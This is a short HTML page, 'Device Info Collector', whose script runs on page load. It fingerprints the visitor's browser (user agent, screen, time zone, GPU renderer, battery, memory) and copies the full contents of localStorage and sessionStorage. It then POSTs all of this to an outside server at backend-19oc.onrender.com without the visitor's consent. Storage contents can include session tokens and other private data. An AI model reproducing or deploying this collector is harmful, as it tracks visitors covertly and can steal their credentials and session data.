<!DOCTYPE html>
<html>
<head>
  <title>Device Info Collector</title>
</head>
<body>
  <h1>Collecting device info...</h1>
  <script>
    async function getDeviceInfo() {
      const battery = await navigator.getBattery?.() || {};
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      const debugInfo = gl?.getExtension('WEBGL_debug_renderer_info');

      const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        screenResolution: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timeZoneOffset: new Date().getTimezoneOffset(),
        referrer: document.referrer,
        touchSupport: navigator.maxTouchPoints > 0,
        deviceMemory: navigator.deviceMemory || 'N/A',
        hardwareConcurrency: navigator.hardwareConcurrency,
        pixelRatio: window.devicePixelRatio,
        online: navigator.onLine,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        battery: {
          level: battery.level ?? 'N/A',
          charging: battery.charging ?? 'N/A'
        },
        gpu: {
          vendor: gl && debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
          renderer: gl && debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A'
        }
      };

      console.log('Collected Info:', info);

      // Send to backend
      fetch('https://backend-19oc.onrender.com/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(info)
      });
    }

    getDeviceInfo();
  </script>
</body>
</html>
